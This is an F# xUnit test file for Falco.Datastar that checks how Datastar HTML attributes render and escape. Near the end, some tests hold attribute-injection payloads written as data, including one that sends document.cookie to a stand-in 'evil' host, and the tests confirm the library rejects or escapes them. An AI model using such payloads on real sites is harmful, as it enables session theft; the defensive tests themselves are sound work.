namespace Falco.Datastar.Tests

open System
open Falco.Datastar
open Falco.Markup
open FsUnit.Xunit
open Xunit

module DsTests =
    [<Fact>]
    let ``Ds.bind should create an attribute`` () =
        renderAttr (Ds.bind "signalPath")
        |> should equal """<div data-bind:signal-path></div>"""

    [<Fact>]
    let ``Ds.post`` () =
        Ds.post "/channel"
        |> should equal """@post('/channel')"""

    [<Fact>]
    let ``Ds.jsonSignalsOptions Exclude`` () =
        let filterFiles : SignalsFilter = { IncludePattern = ValueNone; ExcludePattern = ValueSome "files" }
        renderAttr (Ds.jsonSignalsOptions filterFiles)
        |> should equal """<div data-json-signals="{ exclude: /files/ }"></div>"""

    [<Fact>]
    let ``Ds.jsonSignalsOptions Include`` () =
        let filterFiles : SignalsFilter = { IncludePattern = ValueSome "files"; ExcludePattern = ValueNone }
        renderAttr (Ds.jsonSignalsOptions filterFiles)
        |> should equal """<div data-json-signals="{ include: /files/ }"></div>"""

    [<Fact>]
    let ``Ds.jsonSignalsOptions Both`` () =
        let filterFiles : SignalsFilter = { IncludePattern = ValueSome "files$"; ExcludePattern = ValueSome "^files" }
        renderAttr (Ds.jsonSignalsOptions filterFiles)
        |> should equal """<div data-json-signals="{ include: /files$/,exclude: /^files/ }"></div>"""

    [<Fact>]
    let ``Ds.jsonSignalsOptions Terse`` () =
        renderAttr (Ds.jsonSignalsOptions (terse = true))
        |> should equal """<div data-json-signals__terse></div>"""

    [<Fact>]
    let ``Ds.jsonSignalsOptions Terse and Both Filters`` () =
        let filterFiles : SignalsFilter = { IncludePattern = ValueSome "files$"; ExcludePattern = ValueSome "^files" }
        renderAttr (Ds.jsonSignalsOptions (filterFiles, terse = true))
        |> should equal """<div data-json-signals__terse="{ include: /files$/,exclude: /^files/ }"></div>"""

    [<Fact>]
    let ``Ds.onIntersect No Options`` () =
        renderAttr (Ds.onIntersect "@get('/hello')")
        |> should equal """<div data-on-intersect="@get('/hello')"></div>"""

    [<Fact>]
    let ``Ds.onIntersect Threshold`` () =
        renderAttr (Ds.onIntersect ("@get('/hello')", threshold=50))
        |> should equal """<div data-on-intersect__threshold.50="@get('/hello')"></div>"""

    [<Fact>]
    let ``Ds.style`` () =
        renderAttr (Ds.style ("display", "$hiding && 'none'"))
        |> should equal """<div data-style:display="$hiding && 'none'"></div>"""

    // Datastar baseline

    [<Fact>]
    let ``Ds.cdnSrc is pinned to the Datastar 1.0.4 bundle`` () =
        Ds.cdnSrc
        |> should equal "https://cdn.jsdelivr.net/gh/starfederation/datastar@v1.0.4/bundles/datastar.js"

    [<Fact>]
    let ``Ds.rocketCdnSrc is the Rocket bundle of the same version`` () =
        Ds.rocketCdnSrc
        |> should equal "https://cdn.jsdelivr.net/gh/starfederation/datastar@v1.0.4/bundles/datastar-rocket.js"

    [<Fact>]
    let ``Ds.cdnScript and Ds.rocketCdnScript render module script tags`` () =
        renderNode Ds.cdnScript
        |> should equal """<script type="module" src="https://cdn.jsdelivr.net/gh/starfederation/datastar@v1.0.4/bundles/datastar.js"></script>"""
        renderNode Ds.rocketCdnScript
        |> should equal """<script type="module" src="https://cdn.jsdelivr.net/gh/starfederation/datastar@v1.0.4/bundles/datastar-rocket.js"></script>"""

    // @setAll takes (value, filter) and @toggleAll takes (filter), in Datastar 1.0.4 and in RC.7

    [<Fact>]
    let ``Ds.setAll passes the value first and the prefix as an include filter`` () =
        Ds.setAll ("foo.", true)
        |> should equal """@setAll(true, { include: /^foo\./ })"""

    [<Fact>]
    let ``Ds.setAll emits numbers unquoted and strings quoted`` () =
        Ds.setAll ("foo.", 5) |> should equal """@setAll(5, { include: /^foo\./ })"""
        Ds.setAll ("foo.", "x") |> should equal """@setAll('x', { include: /^foo\./ })"""

    [<Fact>]
    let ``Ds.setAll escapes string values so they cannot break out of the attribute`` () =
        Ds.setAll ("foo.", "it's \"q\"")
        |> should equal """@setAll('it\'s &quot;q&quot;', { include: /^foo\./ })"""

    [<Fact>]
    let ``Ds.setAllFiltered without a filter sets every signal`` () =
        Ds.setAllFiltered (false, SignalsFilter.None)
        |> should equal "@setAll(false)"

    [<Fact>]
    let ``Ds.setAllFiltered uses the given include and exclude filter`` () =
        Ds.setAllFiltered (true, { IncludePattern = ValueSome "^form\\."; ExcludePattern = ValueSome "\\.id$" })
        |> should equal """@setAll(true, { include: /^form\./,exclude: /\.id$/ })"""

    [<Fact>]
    let ``Ds.toggleAll takes the prefix as an include filter`` () =
        Ds.toggleAll "foo."
        |> should equal """@toggleAll({ include: /^foo\./ })"""

    [<Fact>]
    let ``Ds.toggleAllFiltered without a filter toggles every signal`` () =
        Ds.toggleAllFiltered SignalsFilter.None
        |> should equal "@toggleAll()"

    [<Fact>]
    let ``Ds.peek wraps the expression in a function for the peek action`` () =
        Ds.peek "$count"
        |> should equal "@peek(() => $count)"

    [<Fact>]
    let ``Ds.expression joins statements with a semicolon, which is what Datastar reads as the end of one`` () =
        Ds.expression [ "$_menuOpen = !$_menuOpen"; "$_count = 0" ]
        |> should equal "$_menuOpen = !$_menuOpen ; $_count = 0"

    // data-bind on custom elements and web components

    [<Fact>]
    let ``Ds.bindProp binds a signal to an element property`` () =
        renderAttr (Ds.bindProp (SignalPath.sp "checkedState", "checked"))
        |> should equal """<div data-bind:checked-state__prop.checked></div>"""

    [<Fact>]
    let ``Ds.bindProp writes the property name in kebab-case`` () =
        renderAttr (Ds.bindProp (SignalPath.sp "val", "someProp"))
        |> should equal """<div data-bind:val__prop.some-prop></div>"""

    [<Fact>]
    let ``Ds.bindProp can also list events`` () =
        renderAttr (Ds.bindProp (SignalPath.sp "val", "value", [ "input"; "change" ]))
        |> should equal """<div data-bind:val__prop.value__event.input.change></div>"""

    [<Fact>]
    let ``Ds.bindEvent lists the events`` () =
        renderAttr (Ds.bindEvent (SignalPath.sp "val", "input", [ "change" ]))
        |> should equal """<div data-bind:val__event.input.change></div>"""

    // The __case modifier changes the casing of the name an attribute creates (bind, class, computed, indicator, on, ref, signals)

    [<Fact>]
    let ``Ds.withCase adds the case modifier to an attribute with a value`` () =
        renderAttr (Ds.signal (SignalPath.sp "myValue", 1) |> Ds.withCase CaseStyle.Snake)
        |> should equal """<div data-signals:my-value__case.snake="1"></div>"""

    [<Fact>]
    let ``Ds.withCase adds the case modifier to an attribute without a value`` () =
        renderAttr (Ds.bind (SignalPath.sp "myValue") |> Ds.withCase CaseStyle.Pascal)
        |> should equal """<div data-bind:my-value__case.pascal></div>"""

    [<Fact>]
    let ``Ds.withCase can name each of the four styles`` () =
        let styleOf caseStyle = renderAttr (Ds.indicator (SignalPath.sp "myValue") |> Ds.withCase caseStyle)
        styleOf CaseStyle.Camel |> should equal """<div data-indicator:my-value__case.camel></div>"""
        styleOf CaseStyle.Kebab |> should equal """<div data-indicator:my-value__case.kebab></div>"""
        styleOf CaseStyle.Snake |> should equal """<div data-indicator:my-value__case.snake></div>"""
        styleOf CaseStyle.Pascal |> should equal """<div data-indicator:my-value__case.pascal></div>"""

    [<Fact>]
    let ``Ds.withCase keeps modifiers that are already there`` () =
        renderAttr (Ds.signal (SignalPath.sp "myValue", 1, ifMissing = true) |> Ds.withCase CaseStyle.Snake)
        |> should equal """<div data-signals:my-value__ifmissing__case.snake="1"></div>"""

    [<Fact>]
    let ``Ds.withCase on an event name lets a camelCase event be listened to`` () =
        renderAttr (Ds.onEvent ("my-event", "$seen = true") |> Ds.withCase CaseStyle.Camel)
        |> should equal """<div data-on:my-event__case.camel="$seen = true"></div>"""

    // Content Security Policy: Datastar reads data-nonce from the <html> element (csp.ts)

    [<Fact>]
    let ``Ds.nonce writes data-nonce`` () =
        renderAttr (Ds.nonce "r4nd0m")
        |> should equal """<div data-nonce="r4nd0m"></div>"""

    [<Fact>]
    let ``Ds.nonce escapes the value so it cannot break out of the attribute`` () =
        renderAttr (Ds.nonce "a\"b")
        |> should equal """<div data-nonce="a&quot;b"></div>"""

    // data-on target and fetch options

    [<Fact>]
    let ``Ds.onEvent Document listens on the document`` () =
        renderAttr (Ds.onEvent ("keydown", "$k = evt.key", [ Document ]))
        |> should equal """<div data-on:keydown__document="$k = evt.key"></div>"""

    // The three ignore attributes and the two signal-patch attributes, which the mutation run showed had no test at all.
    // A plugin name written wrong is an attribute Datastar quietly does not run, so each one is pinned.

    [<Fact>]
    let ``Ds.ignore writes the ignore attribute`` () =
        renderAttr Ds.ignore |> should equal """<div data-ignore></div>"""

    [<Fact>]
    let ``Ds.ignoreSelf adds the self modifier`` () =
        renderAttr Ds.ignoreSelf |> should equal """<div data-ignore__self></div>"""

    [<Fact>]
    let ``Ds.ignoreMorph writes its own attribute, which is not the one Datastar ignores elements with`` () =
        // data-ignore-morph tells the patcher to skip the element; data-ignore__morph would be a modifier of data-ignore
        renderAttr Ds.ignoreMorph |> should equal """<div data-ignore-morph></div>"""

    [<Fact>]
    let ``Ds.preserveAttr writes the attribute and its list of names`` () =
        renderAttr (Ds.preserveAttr "open") |> should equal """<div data-preserve-attr="open"></div>"""
        renderAttr (Ds.preserveAttr "open class")
        |> should equal """<div data-preserve-attr="open class"></div>"""

    [<Fact>]
    let ``Ds.onSignalPatch writes the expression it is given`` () =
        renderAttr (Ds.onSignalPatch "$last = $value")
        |> should equal """<div data-on-signal-patch="$last = $value"></div>"""

    [<Fact>]
    let ``Ds.onSignalPatch takes a delay, a debounce and a throttle`` () =
        renderAttr (Ds.onSignalPatch ("$a = 1", delayMs = 250))
        |> should equal """<div data-on-signal-patch__delay.250ms="$a = 1"></div>"""
        renderAttr (Ds.onSignalPatch ("$a = 1", debounce = Debounce.With(TimeSpan.FromMilliseconds 100.0)))
        |> should equal """<div data-on-signal-patch__debounce.100ms="$a = 1"></div>"""
        renderAttr (Ds.onSignalPatch ("$a = 1", throttle = Throttle.With(100.0)))
        |> should equal """<div data-on-signal-patch__throttle.100ms="$a = 1"></div>"""

    // data-ref puts the signal name in the attribute's VALUE, not in its key, so a wrong plugin name is the only way
    // for it to go wrong and there is no test for it at all until the mutation run said so.
    [<Fact>]
    let ``Ds.ref puts the signal name in the value, so the element can be read as a signal`` () =
        renderAttr (Ds.ref "card")
        |> should equal """<div data-ref="card"></div>"""
        // It is deliberately not data-ref:card, which would name the signal from the attribute key instead
        if (renderAttr (Ds.ref "card")).Contains ":card" then
            failwith "data-ref must put the name in the value, not the key"

    [<Fact>]
    let ``Ds.ref escapes the name, so it cannot break out of the attribute`` () =
        renderAttr (Ds.ref "a\" onmouseover=\"x")
        |> should equal """<div data-ref="a&quot; onmouseover=&quot;x"></div>"""

    // Every part of a key goes into the name of an attribute, and Falco.Markup does not escape an attribute name.
    // A quote in the attribute name, in the plugin name or in the name of a modifier would end the name early and could add attributes of its own.

    [<Fact>]
    let ``DsAttr refuses a plugin name that would end the attribute name early`` () =
        let hostile = "text\" onmouseover=\"fetch('//evil/'+document.cookie)"
        let error = Assert.Throws<ArgumentException>(fun () -> DsAttr.create { Name = hostile; Target = ValueNone; Modifiers = []; HasCaseModifier = false; Value = ValueSome "$x" } |> ignore)
        error.Message |> should haveSubstring "attribute name"
        error.Message |> should haveSubstring "it contains '\"'"

    [<Fact>]
    let ``DsAttr refuses a modifier name that would end the attribute name early`` () =
        let hostile = "ifmissing\" onload=\"alert(1)"
        let error =
            Assert.Throws<ArgumentException>(fun () ->
                DsAttr.start "text"
                |> DsAttr.addModifier { Name = hostile; Tags = [] }
                |> DsAttr.addValue "$x"
                |> DsAttr.create
                |> ignore)
        error.Message |> should haveSubstring "modifier name"
        error.Message |> should haveSubstring "it contains '\"'"

    [<Fact>]
    let ``DsAttr refuses a modifier value that would end the attribute name early`` () =
        let error =
            Assert.Throws<ArgumentException>(fun () ->
                DsAttr.start "text"
                |> DsAttr.addModifier { Name = "debounce"; Tags = [ "100ms\" x=\"" ] }
                |> DsAttr.create
                |> ignore)
        error.Message |> should haveSubstring "modifier value"
        error.Message |> should haveSubstring "it contains '\"'"

    [<Fact>]
    let ``DsAttr refuses a plugin name with a double underscore, which Datastar reads as a modifier`` () =
        let error = Assert.Throws<ArgumentException>(fun () -> DsAttr.create { Name = "a__b"; Target = ValueNone; Modifiers = []; HasCaseModifier = false; Value = ValueSome "$x" } |> ignore)
        error.Message |> should haveSubstring "it contains '__'"
